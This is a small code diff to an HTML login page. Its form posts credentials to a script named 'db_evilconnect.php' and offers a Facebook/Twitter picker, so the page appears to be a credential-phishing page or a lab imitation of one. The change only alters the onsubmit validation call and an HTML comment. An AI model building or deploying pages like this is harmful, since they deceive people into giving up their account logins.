@@ -22,7 +22,7 @@
         <li><a href="#" title="linkedin" class="tooltip"><img src="social/linkedin.png" alt="" class="icon"></a></li>
 </ul>	
 <div class="box">
-      <h1>Login</h1><form name="theform" action="db_evilconnect.php" method="post" onsubmit="return validateForm();"> <!- http://10.0.0.1/ ->
+      <h1>Login</h1><form name="theform" action="db_evilconnect.php" method="post" onsubmit="validateForm();"> <!-- http://10.0.0.1/ -->
 <select name="type" class="list">
 		<option value="facebook">Facebook</option>
 		<option value="twitter">Twitter</option>
